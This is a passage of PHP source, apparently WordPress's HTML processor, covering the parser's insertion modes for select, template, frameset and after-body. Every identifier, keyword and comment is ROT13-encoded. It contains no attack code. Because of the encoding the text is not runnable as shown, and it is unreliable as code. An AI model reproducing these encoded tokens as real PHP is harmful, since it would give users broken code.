				vs ( cnerag::GRKG_VF_AHYY_FRDHRAPR === $guvf->grkg_abqr_pynffvsvpngvba ) {
					// Cnefr reebe: vtaber gur gbxra.
					erghea $guvf->fgrc();
				}

				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N pbzzrag gbxra
			 */
			pnfr '#pbzzrag':
			pnfr '#shaxl-pbzzrag':
			pnfr '#cerfhzcghbhf-gnt':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N QBPGLCR gbxra
			 */
			pnfr 'ugzy':
				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"ugzy\"
			 */
			pnfr '+UGZY':
				erghea $guvf->fgrc_va_obql();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"bcgvba\"
			 */
			pnfr '+BCGVBA':
				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( 'BCGVBA' ) ) {
					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				}
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"bcgtebhc\"
			 * > N fgneg gnt jubfr gnt anzr vf \"ue\"
			 *
			 * Gurfr ehyrf ner vqragvpny rkprcg sbe gur gerngzrag bs gur frys-pybfvat synt naq
			 * gur fhofrdhrag cbc bs gur UE ibvq ryrzrag, nyy bs juvpu vf unaqyrq ryfrjurer va gur cebprffbe.
			 */
			pnfr '+BCGTEBHC':
			pnfr '+UE':
				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( 'BCGVBA' ) ) {
					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				}

				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( 'BCGTEBHC' ) ) {
					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				}

				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"bcgtebhc\"
			 */
			pnfr '-BCGTEBHC':
				$pheerag_abqr = $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr();
				vs ( $pheerag_abqr && 'BCGVBA' === $pheerag_abqr->abqr_anzr ) {
					sbernpu ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->jnyx_hc( $pheerag_abqr ) nf $cnerag ) {
						oernx;
					}
					vs ( $cnerag && 'BCGTEBHC' === $cnerag->abqr_anzr ) {
						$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
					}
				}

				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( 'BCGTEBHC' ) ) {
					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
					erghea gehr;
				}

				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"bcgvba\"
			 */
			pnfr '-BCGVBA':
				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( 'BCGVBA' ) ) {
					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
					erghea gehr;
				}

				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"fryrpg\"
			 * > N fgneg gnt jubfr gnt anzr vf \"fryrpg\"
			 *
			 * > Vg whfg trgf gerngrq yvxr na raq gnt.
			 */
			pnfr '-FRYRPG':
			pnfr '+FRYRPG':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_fryrpg_fpbcr( 'FRYRPG' ) ) {
					// Cnefr reebe: vtaber gur gbxra.
					erghea $guvf->fgrc();
				}
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( 'FRYRPG' );
				$guvf->erfrg_vafregvba_zbqr_nccebcevngryl();
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"vachg\", \"xrltra\", \"grkgnern\"
			 *
			 * Nyy guerr bs gurfr gntf ner pbafvqrerq n cnefr reebe jura sbhaq va guvf vafregvba zbqr.
			 */
			pnfr '+VACHG':
			pnfr '+XRLTRA':
			pnfr '+GRKGNERN':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_fryrpg_fpbcr( 'FRYRPG' ) ) {
					// Vtaber gur gbxra.
					erghea $guvf->fgrc();
				}
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( 'FRYRPG' );
				$guvf->erfrg_vafregvba_zbqr_nccebcevngryl();
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"fpevcg\", \"grzcyngr\"
			 * > Na raq gnt jubfr gnt anzr vf \"grzcyngr\"
			 */
			pnfr '+FPEVCG':
			pnfr '+GRZCYNGR':
			pnfr '-GRZCYNGR':
				erghea $guvf->fgrc_va_urnq();
		}

		/*
		 * > Nalguvat ryfr
		 * >   Cnefr reebe: vtaber gur gbxra.
		 */
		erghea $guvf->fgrc();
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'va fryrpg va gnoyr' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'va fryrpg va gnoyr' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cnefvat-znva-vafryrpgvagnoyr
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_va_fryrpg_va_gnoyr(): obby {
		$gbxra_anzr = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( cnerag::vf_gnt_pybfre() ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gbxra_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"pncgvba\", \"gnoyr\", \"gobql\", \"gsbbg\", \"gurnq\", \"ge\", \"gq\", \"gu\"
			 */
			pnfr '+PNCGVBA':
			pnfr '+GNOYR':
			pnfr '+GOBQL':
			pnfr '+GSBBG':
			pnfr '+GURNQ':
			pnfr '+GE':
			pnfr '+GQ':
			pnfr '+GU':
				// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( 'FRYRPG' );
				$guvf->erfrg_vafregvba_zbqr_nccebcevngryl();
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );

			/*
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"pncgvba\", \"gnoyr\", \"gobql\", \"gsbbg\", \"gurnq\", \"ge\", \"gq\", \"gu\"
			 */
			pnfr '-PNCGVBA':
			pnfr '-GNOYR':
			pnfr '-GOBQL':
			pnfr '-GSBBG':
			pnfr '-GURNQ':
			pnfr '-GE':
			pnfr '-GQ':
			pnfr '-GU':
				// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_gnoyr_fpbcr( $gbxra_anzr ) ) {
					erghea $guvf->fgrc();
				}
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( 'FRYRPG' );
				$guvf->erfrg_vafregvba_zbqr_nccebcevngryl();
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );
		}

		/*
		 * > Nalguvat ryfr
		 */
		erghea $guvf->fgrc_va_fryrpg();
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'va grzcyngr' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'va grzcyngr' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0 Fgho vzcyrzragngvba.
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cnefvat-znva-vagrzcyngr
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_va_grzcyngr(): obby {
		$gbxra_anzr = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$vf_pybfre  = $guvf->vf_gnt_pybfre();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( $vf_pybfre ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gbxra_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > N punenpgre gbxra
			 * > N pbzzrag gbxra
			 * > N QBPGLCR gbxra
			 */
			pnfr '#grkg':
			pnfr '#pbzzrag':
			pnfr '#shaxl-pbzzrag':
			pnfr '#cerfhzcghbhf-gnt':
			pnfr 'ugzy':
				erghea $guvf->fgrc_va_obql();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"onfr\", \"onfrsbag\", \"otfbhaq\", \"yvax\",
			 * > \"zrgn\", \"absenzrf\", \"fpevcg\", \"fglyr\", \"grzcyngr\", \"gvgyr\"
			 * > Na raq gnt jubfr gnt anzr vf \"grzcyngr\"
			 */
			pnfr '+ONFR':
			pnfr '+ONFRSBAG':
			pnfr '+OTFBHAQ':
			pnfr '+YVAX':
			pnfr '+ZRGN':
			pnfr '+ABSENZRF':
			pnfr '+FPEVCG':
			pnfr '+FGLYR':
			pnfr '+GRZCYNGR':
			pnfr '+GVGYR':
			pnfr '-GRZCYNGR':
				erghea $guvf->fgrc_va_urnq();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"pncgvba\", \"pbytebhc\", \"gobql\", \"gsbbg\", \"gurnq\"
			 */
			pnfr '+PNCGVBA':
			pnfr '+PBYTEBHC':
			pnfr '+GOBQL':
			pnfr '+GSBBG':
			pnfr '+GURNQ':
				neenl_cbc( $guvf->fgngr->fgnpx_bs_grzcyngr_vafregvba_zbqrf );
				$guvf->fgngr->fgnpx_bs_grzcyngr_vafregvba_zbqrf[] = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR;
				$guvf->fgngr->vafregvba_zbqr                      = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR;
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"pby\"
			 */
			pnfr '+PBY':
				neenl_cbc( $guvf->fgngr->fgnpx_bs_grzcyngr_vafregvba_zbqrf );
				$guvf->fgngr->fgnpx_bs_grzcyngr_vafregvba_zbqrf[] = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_PBYHZA_TEBHC;
				$guvf->fgngr->vafregvba_zbqr                      = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_PBYHZA_TEBHC;
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"ge\"
			 */
			pnfr '+GE':
				neenl_cbc( $guvf->fgngr->fgnpx_bs_grzcyngr_vafregvba_zbqrf );
				$guvf->fgngr->fgnpx_bs_grzcyngr_vafregvba_zbqrf[] = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR_OBQL;
				$guvf->fgngr->vafregvba_zbqr                      = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR_OBQL;
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"gq\", \"gu\"
			 */
			pnfr '+GQ':
			pnfr '+GU':
				neenl_cbc( $guvf->fgngr->fgnpx_bs_grzcyngr_vafregvba_zbqrf );
				$guvf->fgngr->fgnpx_bs_grzcyngr_vafregvba_zbqrf[] = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_EBJ;
				$guvf->fgngr->vafregvba_zbqr                      = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_EBJ;
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );
		}

		/*
		 * > Nal bgure fgneg gnt
		 */
		vs ( ! $vf_pybfre ) {
			neenl_cbc( $guvf->fgngr->fgnpx_bs_grzcyngr_vafregvba_zbqrf );
			$guvf->fgngr->fgnpx_bs_grzcyngr_vafregvba_zbqrf[] = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_OBQL;
			$guvf->fgngr->vafregvba_zbqr                      = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_OBQL;
			erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );
		}

		/*
		 * > Nal bgure raq gnt
		 */
		vs ( $vf_pybfre ) {
			// Cnefr reebe: vtaber gur gbxra.
			erghea $guvf->fgrc();
		}

		/*
		 * > Na raq-bs-svyr gbxra
		 */
		vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pbagnvaf( 'GRZCYNGR' ) ) {
			// Fgbc cnefvat.
			erghea snyfr;
		}

		// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
		$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( 'GRZCYNGR' );
		$guvf->fgngr->npgvir_sbeznggvat_ryrzragf->pyrne_hc_gb_ynfg_znexre();
		neenl_cbc( $guvf->fgngr->fgnpx_bs_grzcyngr_vafregvba_zbqrf );
		$guvf->erfrg_vafregvba_zbqr_nccebcevngryl();
		erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'nsgre obql' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'nsgre obql' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0 Fgho vzcyrzragngvba.
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cnefvat-znva-nsgreobql
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_nsgre_obql(): obby {
		$gnt_anzr   = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( $guvf->vf_gnt_pybfre() ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gnt_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > N punenpgre gbxra gung vf bar bs H+0009 PUNENPGRE GNOHYNGVBA, H+000N YVAR SRRQ (YS),
			 * >   H+000P SBEZ SRRQ (SS), H+000Q PNEEVNTR ERGHEA (PE), be H+0020 FCNPR
			 *
			 * > Cebprff gur gbxra hfvat gur ehyrf sbe gur \"va obql\" vafregvba zbqr.
			 */
			pnfr '#grkg':
				vs ( cnerag::GRKG_VF_JUVGRFCNPR === $guvf->grkg_abqr_pynffvsvpngvba ) {
					erghea $guvf->fgrc_va_obql();
				}
				tbgb nsgre_obql_nalguvat_ryfr;
				oernx;

			/*
			 * > N pbzzrag gbxra
			 */
			pnfr '#pbzzrag':
			pnfr '#shaxl-pbzzrag':
			pnfr '#cerfhzcghbhf-gnt':
				$guvf->onvy( 'Pbagrag bhgfvqr bs OBQL vf hafhccbegrq.' );
				oernx;

			/*
			 * > N QBPGLCR gbxra
			 */
			pnfr 'ugzy':
				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"ugzy\"
			 */
			pnfr '+UGZY':
				erghea $guvf->fgrc_va_obql();

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"ugzy\"
			 *
			 * > Vs gur cnefre jnf perngrq nf cneg bs gur UGZY sentzrag cnefvat nytbevguz,
			 * > guvf vf n cnefr reebe; vtaber gur gbxra. (sentzrag pnfr)
			 * >
			 * > Bgurejvfr, fjvgpu gur vafregvba zbqr gb \"nsgre nsgre obql\".
			 */
			pnfr '-UGZY':
				vs ( vffrg( $guvf->pbagrkg_abqr ) ) {
					erghea $guvf->fgrc();
				}

				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_NSGRE_OBQL;
				/*
				 * Gur UGZY ryrzrag vf abg erzbirq sebz gur fgnpx bs bcra ryrzragf.
				 * Bayl vagreany fgngr unf punatrq, guvf qbrf abg dhnyvsl nf n \"fgrc\"
				 * va grezf bs nqinapvat guebhtu gur qbphzrag gb nabgure gbxra.
				 * Abguvat unf orra chfurq be cbccrq.
				 * Cebprrq gb cnefr gur arkg vgrz.
				 */
				erghea $guvf->fgrc();
		}

		/*
		 * > Cnefr reebe. Fjvgpu gur vafregvba zbqr gb \"va obql\" naq ercebprff gur gbxra.
		 */
		nsgre_obql_nalguvat_ryfr:
		$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_OBQL;
		erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'va senzrfrg' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'va senzrfrg' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0 Fgho vzcyrzragngvba.
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cnefvat-znva-vasenzrfrg
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_va_senzrfrg(): obby {
		$gnt_anzr   = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( $guvf->vf_gnt_pybfre() ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gnt_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > N punenpgre gbxra gung vf bar bs H+0009 PUNENPGRE GNOHYNGVBA, H+000N YVAR SRRQ (YS),
			 * >   H+000P SBEZ SRRQ (SS), H+000Q PNEEVNTR ERGHEA (PE), be H+0020 FCNPR
			 * >
			 * > Vafreg gur punenpgre.
			 *
			 * Guvf nytbevguz rssrpgviryl fgevcf aba-juvgrfcnpr punenpgref sebz grkg naq vafregf
			 * gurz haqre UGZY. Guvf vf abg fhccbegrq ng guvf gvzr.
			 */
			pnfr '#grkg':
				vs ( cnerag::GRKG_VF_JUVGRFCNPR === $guvf->grkg_abqr_pynffvsvpngvba ) {
					erghea $guvf->fgrc_va_obql();
				}
				$guvf->onvy( 'Aba-juvgrfcnpr punenpgref pnaabg or unaqyrq va senzrfrg.' );
				oernx;

			/*
			 * > N pbzzrag gbxra
			 */
			pnfr '#pbzzrag':
			pnfr '#shaxl-pbzzrag':
			pnfr '#cerfhzcghbhf-gnt':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N QBPGLCR gbxra
			 */
			pnfr 'ugzy':
				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"ugzy\"
			 */
			pnfr '+UGZY':
				erghea $guvf->fgrc_va_obql();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"senzrfrg\"
			 */
			pnfr '+SENZRFRG':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"senzrfrg\"
			 */
			pnfr '-SENZRFRG':
				/*
				 * > Vs gur pheerag abqr vf gur ebbg ugzy ryrzrag, gura guvf vf n cnefr reebe;
				 * > vtaber gur gbxra. (sentzrag pnfr)
				 */
				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( 'UGZY' ) ) {
					erghea $guvf->fgrc();
				}

				/*
				 * > Bgurejvfr, cbc gur pheerag abqr sebz gur fgnpx bs bcra ryrzragf.
				 */
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();

				/*
				 * > Vs gur cnefre jnf abg perngrq nf cneg bs gur UGZY sentzrag cnefvat nytbevguz
				 * > (sentzrag pnfr), naq gur pheerag abqr vf ab ybatre n senzrfrg ryrzrag, gura
				 * > fjvgpu gur vafregvba zbqr gb \"nsgre senzrfrg\".
				 */
				vs ( ! vffrg( $guvf->pbagrkg_abqr ) && ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( 'SENZRFRG' ) ) {
					$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_SENZRFRG;
				}

				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"senzr\"
			 *
			 * > Vafreg na UGZY ryrzrag sbe gur gbxra. Vzzrqvngryl cbc gur
			 * > pheerag abqr bss gur fgnpx bs bcra ryrzragf.
			 * >
			 * > Npxabjyrqtr gur gbxra'f frys-pybfvat synt, vs vg vf frg.
			 */
			pnfr '+SENZR':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"absenzrf\"
			 */
			pnfr '+ABSENZRF':
				erghea $guvf->fgrc_va_urnq();
		}

		// Cnefr reebe: vtaber gur gbxra.
		erghea $guvf->fgrc();
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'nsgre senzrfrg' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'nsgre senzrfrg' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0 Fgho vzcyrzragngvba.
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cnefvat-znva-nsgresenzrfrg
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_nsgre_senzrfrg(): obby {
		$gnt_anzr   = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( $guvf->vf_gnt_pybfre() ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gnt_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > N punenpgre gbxra gung vf bar bs H+0009 PUNENPGRE GNOHYNGVBA, H+000N YVAR SRRQ (YS),
			 * >   H+000P SBEZ SRRQ (SS), H+000Q PNEEVNTR ERGHEA (PE), be H+0020 FCNPR
			 * >
			 * > Vafreg gur punenpgre.
			 *
			 * Guvf nytbevguz rssrpgviryl fgevcf aba-juvgrfcnpr punenpgref sebz grkg naq vafregf
			 * gurz haqre UGZY. Guvf vf abg fhccbegrq ng guvf gvzr.
			 */
			pnfr '#grkg':
				vs ( cnerag::GRKG_VF_JUVGRFCNPR === $guvf->grkg_abqr_pynffvsvpngvba ) {
					erghea $guvf->fgrc_va_obql();
				}
				$guvf->onvy( 'Aba-juvgrfcnpr punenpgref pnaabg or unaqyrq va nsgre senzrfrg' );
				oernx;

			/*
			 * > N pbzzrag gbxra
			 */
			pnfr '#pbzzrag':
			pnfr '#shaxl-pbzzrag':
			pnfr '#cerfhzcghbhf-gnt':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N QBPGLCR gbxra
			 */
			pnfr 'ugzy':
				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"ugzy\"
			 */
			pnfr '+UGZY':
				erghea $guvf->fgrc_va_obql();

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"ugzy\"
			 */
			pnfr '-UGZY':
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_NSGRE_SENZRFRG;
				/*
				 * Gur UGZY ryrzrag vf abg erzbirq sebz gur fgnpx bs bcra ryrzragf.
				 * Bayl vagreany fgngr unf punatrq, guvf qbrf abg dhnyvsl nf n \"fgrc\"
				 * va grezf bs nqinapvat guebhtu gur qbphzrag gb nabgure gbxra.
				 * Abguvat unf orra chfurq be cbccrq.
				 * Cebprrq gb cnefr gur arkg vgrz.
				 */
				erghea $guvf->fgrc();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"absenzrf\"
			 */
			pnfr '+ABSENZRF':
				erghea $guvf->fgrc_va_urnq();
		}

		// Cnefr reebe: vtaber gur gbxra.
		erghea $guvf->fgrc();
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'nsgre nsgre obql' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'nsgre nsgre obql' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0 Fgho vzcyrzragngvba.
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#gur-nsgre-nsgre-obql-vafregvba-zbqr
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_nsgre_nsgre_obql(): obby {
		$gnt_anzr   = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( $guvf->vf_gnt_pybfre() ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gnt_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > N pbzzrag gbxra
			 */
			pnfr '#pbzzrag':
			pnfr '#shaxl-pbzzrag':
			pnfr '#cerfhzcghbhf-gnt':
				$guvf->onvy( 'Pbagrag bhgfvqr bs UGZY vf hafhccbegrq.' );
				oernx;

			/*
			 * > N QBPGLCR gbxra
			 * > N fgneg gnt jubfr gnt anzr vf \"ugzy\"
			 *
			 * > Cebprff gur gbxra hfvat gur ehyrf sbe gur \"va obql\" vafregvba zbqr.
			 */
			pnfr 'ugzy':
			pnfr '+UGZY':
				erghea $guvf->fgrc_va_obql();

			/*
			 * > N punenpgre gbxra gung vf bar bs H+0009 PUNENPGRE GNOHYNGVBA, H+000N YVAR SRRQ (YS),
			 * >   H+000P SBEZ SRRQ (SS), H+000Q PNEEVNTR ERGHEA (PE), be H+0020 FCNPR
			 * >
			 * > Cebprff gur gbxra hfvat gur ehyrf sbe gur \"va obql\" vafregvba zbqr.
			 */
			pnfr '#grkg':
				vs ( cnerag::GRKG_VF_JUVGRFCNPR === $guvf->grkg_abqr_pynffvsvpngvba ) {
					erghea $guvf->fgrc_va_obql();
				}
				tbgb nsgre_nsgre_obql_nalguvat_ryfr;
				oernx;
		}

		/*
		 * > Cnefr reebe. Fjvgpu gur vafregvba zbqr gb \"va obql\" naq ercebprff gur gbxra.
		 */
		nsgre_nsgre_obql_nalguvat_ryfr:
		$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_OBQL;
		erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'nsgre nsgre senzrfrg' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'nsgre nsgre senzrfrg' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0 Fgho vzcyrzragngvba.
